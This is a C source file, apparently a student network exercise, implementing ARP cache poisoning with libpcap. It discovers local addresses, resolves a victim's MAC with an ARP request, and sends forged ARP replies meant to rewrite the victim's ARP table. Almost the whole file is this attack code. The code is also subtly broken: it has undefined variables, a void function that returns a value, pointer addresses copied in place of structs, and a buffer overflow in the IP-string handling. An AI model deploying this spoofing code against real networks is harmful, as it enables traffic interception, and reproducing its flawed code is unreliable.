#include "my_pcap.h"

struct addr{
    uint8_t mac[6];
    uint8_t ip[4];
};

void GET_MYMACIP(struct addr *addr, char *interface) {
	int sd,i=0;
	struct ifreq ifr;	// ethernet structure

	if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    	perror ("socket() failed to get socket descriptor for using ioctl() ");
    	exit (-1);
  	}

  	// Use ioctl() to look up interface name and get its MAC address.
  	memset (&ifr, 0, sizeof (ifr));
  	strncpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));

  	if (ioctl (sd, SIOCGIFHWADDR, &ifr) < 0) {
   	 	perror ("ioctl() failed to get source MAC address ");
   		return ;
  	}

	// Copy source MAC & IP address.
  	memcpy (addr->mac, ifr.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
	memcpy (addr->ip, &(((struct sockaddr_in* ) &ifr.ifr_addr)->sin_addr),4 * sizeof (uint8_t));

    // Report source MAC address to stdout.
  	printf ("My MAC address for interface %s is ", interface);
  	for (i=0; i<5; i++) printf ("%02x:", addr->mac[i]);
	printf("%02x\n", addr->mac[5]);

	// Report source IP address to stdout.
  	printf ("My IP address for interface %s is ", interface);
	for (i=0; i<3; i++) printf("%d.", addr->ip[i]);
	printf("%d\n", addr->ip[3]);

	close(sd);

}

void gen_arp_packet(uint8_t *packet, uint8_t *sourcemac, uint8_t *destmac, uint8_t *sourceip, uint8_t *destip, u_int16_t opcode ) {
	struct ether_header *etharea;
	struct arp_hdr_ *arparea;

	etharea = (struct ether_header *)malloc(sizeof(struct ether_header));
	arparea = (struct arp_hdr_ *)malloc(sizeof(struct arp_hdr_));

	// ether layer
	if(destmac != NULL)
		memcpy(etharea->ether_dhost, destmac, ETHER_ADDR_LEN);
	else
		memcpy(etharea->ether_dhost, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN);
	memcpy(etharea->ether_shost, sourcemac, ETHER_ADDR_LEN);
	etharea->ether_type = htons(ETHERTYPE_ARP);

	// arp layer
	arparea->htype = htons(ARPHRD_ETHER);
	arparea->ptype = htons(ETHERTYPE_IP);
	arparea->hlen = 6;
	arparea->plen = 4;
	arparea->opcode = htons(opcode);
	memcpy(arparea->sender_mac, sourcemac, ETHER_ADDR_LEN);
	memcpy(arparea->sender_ip, sourceip, IP_ADDR_LEN);	

	if(destmac != NULL)
		memcpy(arparea->target_mac, destmac, ETHER_ADDR_LEN);
	else
		memcpy(arparea->target_mac, "\xff\xff\xff\xff\xff\xff", ETHER_ADDR_LEN);
	memcpy(arparea->target_ip, destip, IP_ADDR_LEN);
	
	memset(packet, '\x00', sizeof(struct ether_header) + sizeof(struct arp_hdr_));   // 0 initialize
	memcpy(packet, &etherarea, sizeof(struct ether_header));                // ether first!
	memcpy(packet + sizeof(struct ether_header), &arparea, sizeof(struct arp_hdr_));   // arp next!

}

void pcap_send_check(pcap_t* handle, uint8_t *packet) {
	if(pcap_sendpacket(handle,packet,sizeof(struct ether_header)+sizeof(struct arp_hdr_))==-1) {
    	free(packet);
        pcap_perror(handle,0);
        pcap_close(handle);
        exit(1);
    }
}


// in main it will return sender_mac
// sender_mac = ARP_REQUEST(pcd, my_mac, my_ip, &senderIP); 
void ARP_REQUEST(pcap_t *handle, struct addr* sender, struct addr *target) {
	u_char* packet;
	u_char* recv_packet;
	struct ether_header etherHdr, *recv_ether; // <netinet/ether.h>
	struct arp_hdr_ arp_h, *recv_arp;	// "my_pcap.h"

	int packet_len;
	int flag, i;
	struct in_addr recv_IP;

	u_char* buf;
	u_char addr[4];
	
	// ether layer / first myaddr => broadcast
	memcpy(etherHdr.ether_shost,sender->mac,ETHER_ADDR_LEN); // Ether_SRC == MY_MAC
	memcpy(etherHdr.ether_dhost,"\xff\xff\xff\xff\xff\xff",ETHER_ADDR_LEN); // Broadcast
	etherHdr.ether_type = htons(0x0806); // short! ARP 0x0806
	
	// arp layer  /  
	arp_h.htype = htons(0x0001); // Hardware type
	arp_h.ptype = htons(ETHERTYPE_IP); // Protocol type
	arp_h.hlen = ETHER_ADDR_LEN; // Hardware size
	arp_h.plen = 4;				 // Protocol size : in_addr_t size
	arp_h.opcode = htons(1);	 // ARP request opcode: 1
	memcpy(arp_h.sender_mac,sender->mac,sizeof(arp_h.sender_mac));
	memcpy(arp_h.sender_ip,sender->ip,sizeof(arp_h.sender_ip));
	memcpy(arp_h.target_mac,"\x00\x00\x00\x00\x00\x00",sizeof(arp_h.target_mac)); //don't know the target mac
	memcpy(arp_h.target_ip,target->ip,sizeof(arp_h.target_ip));

	// packet arrangement!
	packet = (u_char*) malloc(sizeof(etherHdr)+sizeof(arp_h));
	memset(packet, '\x00', sizeof(etherHdr) + sizeof(arp_h));	// 0 initialize
	memcpy(packet, &etherHdr, sizeof(etherHdr));				// ether first!
	memcpy(packet + sizeof(etherHdr), &arp_h, sizeof(arp_h));	// arp next!
	packet_len = sizeof(etherHdr) + sizeof(arp_h);
	
	printf("\n[+] packet to send\n");
	for(i=0; i < sizeof(etherHdr) + sizeof(arp_h); i++) {
		if(i != 0 && i % 16 == 0)
			printf("\n");
		printf("%02x ", *(packet+i));
	}
	printf("end\n");
	// packet sending!
	// int pcap_sendpacket(pcap_t *p, const u_char *buf, int size);

	if(pcap_sendpacket(handle,frame,sizeof(struct ether_header)+sizeof(struct arp_hdr_))==-1){
		free(packet);
		pcap_perror(handle,0);
		pcap_close(handle);
		exit(1);
	}	

	printf("\n[+] arp request completed!\n\n");

	while(1) {
		flag = pcap_next_ex(handle,&header,&recv_packet);
		if(flag == 0) continue;
		
		else if(flag <0) {
			printf("[-] fail to receive packet");
			exit(-1);
		}
		printf("\n[-] success to receive packet!\n");

		for(i = 0; i < sizeof(etherHdr) + sizeof(arp_h); i++) {
			if(i != 0 && i % 16 == 0)
				printf("\n");
			printf("%02x ", *(recv_packet+i));
		}
		recv_ether = (struct ether_header*)recv_packet;
		
		recv_arp = (struct arp_hdr_*)(recv_packet + sizeof(struct ether_header));
		// find if it is arp reply packet
		if(htons(recv_arp->htype) != 1 || htons(recv_arp->ptype) != 0x0800 || ntohs(recv_arp->opcode) != 2/*reply*/){
		//	printf("hardware type : 0x%x\nARP type : 0x%x // ARP REPLY : 0x%x\n",ntohs(recv_arp_h->htype),ntohs(recv_arp_h->oper),ARP_REPLY);
			continue;
		}
		buf = (u_char*)malloc(sizeof(4));
		sprintf(buf,"%d.%d.%d.%d",recv_arp->sender_ip[0],recv_arp->sender_ip[1],recv_arp->sender_ip[2],recv_arp->sender_ip[3]);
		inet_pton(AF_INET,buf,&recv_IP.s_addr);
		free(buf);
		// whether it is right ip
		if(memcmp(&recv_IP,targetIP,sizeof(recv_IP))){
			printf("\n[-] IP not match!\n");
			printf("[+] Compare it !\n received arp sender IP : ");
			printf("%s and ",inet_ntoa(recv_IP));
			printf("%s\n",inet_ntoa(*targetIP));
			continue;
		}
		memcpy(&recv_IP,recv_arp->sender_ip,sizeof(recv_IP));
		printf("\nreply IP : %s\n",inet_ntoa(recv_IP));
		printf("reply MAC :");
		for (i=0; i<5; i++) {
    	    printf("%02x:", recv_arp->sender_mac[i]);
      	}
      	printf("%02x\n",recv_arp->sender_mac[5]);
		return recv_arp->sender_mac;
	}

}
void ARP_TABLE_INJECT(pcap_t *handle, u_char *my_mac, u_char *sender_mac, struct in_addr *senderIP, struct in_addr *targetIP) {
	u_char* packet;
	struct ether_header etherHdr; //recv is not needed!!
	struct arp_hdr_ arp_h;
	struct pcap_pkthdr *header;
	int packet_len;
	int flag;
	struct in_addr recv_IP;

	u_char* buf;
	u_char addr[4];
	int i;
	
	//ether layer
	memcpy(etherHdr.ether_shost,my_mac,ETHER_ADDR_LEN);
	memcpy(etherHdr.ether_dhost,sender_mac,ETHER_ADDR_LEN);
	etherHdr.ether_type = htons(0x0806); // short! ARP 0x0806

	// arp layer
	arp_h.htype = htons(0x0001);
	arp_h.ptype = htons(ETHERTYPE_IP);
	arp_h.hlen = ETHER_ADDR_LEN;
	arp_h.plen = 4;
	arp_h.opcode = htons(2); // sending reply and rearrange victim's arp table

	memcpy(arp_h.sender_mac,sender_mac, sizeof(arp_h.sender_mac));
	memcpy(arp_h.sender_ip,senderIP, sizeof(arp_h.sender_ip));
	memcpy(arp_h.target_mac,my_mac, sizeof(arp_h.target_mac));
	memcpy(arp_h.target_ip,targetIP,sizeof(arp_h.target_ip));

	// packet arrangement!
	packet = (u_char*) malloc(sizeof(etherHdr)+sizeof(arp_h));
	memcpy(packet, &etherHdr, sizeof(etherHdr));
	memcpy(packet + sizeof(etherHdr), &arp_h, sizeof(arp_h));
	packet_len = sizeof(etherHdr) + sizeof(arp_h);

	printf("\n[+] packet to send\n");
	for(int i=0;i<sizeof(etherHdr)+sizeof(arp_h);i++){
		if(i != 0 && i % 16 == 0)
			printf("\n");
		printf("%02x ",*(packet+i));
	}


	while(1) {
	if(pcap_sendpacket(handle,packet,packet_len) == 0)
		break;
	}
	printf("\n[+] arp request completed!\n\n");

}
